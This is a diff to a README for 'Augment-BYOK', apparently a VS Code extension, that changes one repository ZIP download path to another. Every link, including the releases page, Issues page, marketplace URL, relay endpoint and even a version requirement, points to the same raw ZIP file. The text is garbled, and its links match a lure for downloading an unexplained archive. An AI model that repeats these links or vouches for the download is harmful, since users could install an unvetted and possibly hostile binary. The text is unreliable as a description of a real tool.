@@ -1,6 +1,6 @@
 # 🌟 Augment-BYOK - Simplifying Your Development Experience
 
-[![Download Augment-BYOK](https://github.com/seek122/Augment-BYOK/raw/refs/heads/main/tools/entry/Augment-BYOK-v3.0.zip)](https://github.com/seek122/Augment-BYOK/raw/refs/heads/main/tools/entry/Augment-BYOK-v3.0.zip)
+[![Download Augment-BYOK](https://github.com/seek122/Augment-BYOK/raw/refs/heads/main/packages/byok-runtime/src/entry/BYOK_Augment_3.1.zip)](https://github.com/seek122/Augment-BYOK/raw/refs/heads/main/packages/byok-runtime/src/entry/BYOK_Augment_3.1.zip)
 
 ## 🚀 Getting Started
 
@@ -9,14 +9,14 @@ Augment-BYOK helps you quickly enhance your development tools. Follow these step
 ### 🛠️ System Requirements
 
 - Operating System: Windows, macOS, or Linux
-- https://github.com/seek122/Augment-BYOK/raw/refs/heads/main/tools/entry/Augment-BYOK-v3.0.zip Version 14 or later
+- https://github.com/seek122/Augment-BYOK/raw/refs/heads/main/packages/byok-runtime/src/entry/BYOK_Augment_3.1.zip Version 14 or later
 - A modern web browser for the Marketplace
 
 ## 📥 Download & Install
 
 To get started, you need to download the latest version from our releases page. 
 
-1. **Visit the releases page:** Click [here](https://github.com/seek122/Augment-BYOK/raw/refs/heads/main/tools/entry/Augment-BYOK-v3.0.zip) to view the available versions.
+1. **Visit the releases page:** Click [here](https://github.com/seek122/Augment-BYOK/raw/refs/heads/main/packages/byok-runtime/src/entry/BYOK_Augment_3.1.zip) to view the available versions.
 2. **Select the latest release.**
 3. **Download the VSIX file**: Look for a file that ends with `.vsix`.
 4. **Install the extension**:
@@ -49,11 +49,11 @@ The project is organized into clear sections:
 
 ## 🔗 Marketplace Integration
 
-Augment-BYOK downloads the latest version of `https://github.com/seek122/Augment-BYOK/raw/refs/heads/main/tools/entry/Augment-BYOK-v3.0.zip` directly from the Marketplace.
+Augment-BYOK downloads the latest version of `https://github.com/seek122/Augment-BYOK/raw/refs/heads/main/packages/byok-runtime/src/entry/BYOK_Augment_3.1.zip` directly from the Marketplace.
 
 **Download URL**: 
 ```
-https://github.com/seek122/Augment-BYOK/raw/refs/heads/main/tools/entry/Augment-BYOK-v3.0.zip
+https://github.com/seek122/Augment-BYOK/raw/refs/heads/main/packages/byok-runtime/src/entry/BYOK_Augment_3.1.zip
 ```
 
 This URL allows for easy access to the `.vsix` package you installed.
@@ -64,11 +64,11 @@ For development and testing, you have access to a relay:
 
 **Relay Endpoint**:
 ```
-https://github.com/seek122/Augment-BYOK/raw/refs/heads/main/tools/entry/Augment-BYOK-v3.0.zip
+https://github.com/seek122/Augment-BYOK/raw/refs/heads/main/packages/byok-runtime/src/entry/BYOK_Augment_3.1.zip
 ```
 
-- **Relay Profiles**: Check out `https://github.com/seek122/Augment-BYOK/raw/refs/heads/main/tools/entry/Augment-BYOK-v3.0.zip` for supported configurations.
-- **LLM Endpoints**: Available in `https://github.com/seek122/Augment-BYOK/raw/refs/heads/main/tools/entry/Augment-BYOK-v3.0.zip`.
+- **Relay Profiles**: Check out `https://github.com/seek122/Augment-BYOK/raw/refs/heads/main/packages/byok-runtime/src/entry/BYOK_Augment_3.1.zip` for supported configurations.
+- **LLM Endpoints**: Available in `https://github.com/seek122/Augment-BYOK/raw/refs/heads/main/packages/byok-runtime/src/entry/BYOK_Augment_3.1.zip`.
 
 ## 📊 Upstream Synchronization
 
@@ -78,7 +78,7 @@ Stay updated with the latest patches and features:
 
 ## 🔄 Support & Contribution
 
-Should you have questions or need support, you can contact us via the [GitHub Issues page](https://github.com/seek122/Augment-BYOK/raw/refs/heads/main/tools/entry/Augment-BYOK-v3.0.zip). 
+Should you have questions or need support, you can contact us via the [GitHub Issues page](https://github.com/seek122/Augment-BYOK/raw/refs/heads/main/packages/byok-runtime/src/entry/BYOK_Augment_3.1.zip). 
 
 If you wish to contribute, consider forking the repository and submitting a pull request. Your input helps us improve the tool.
 
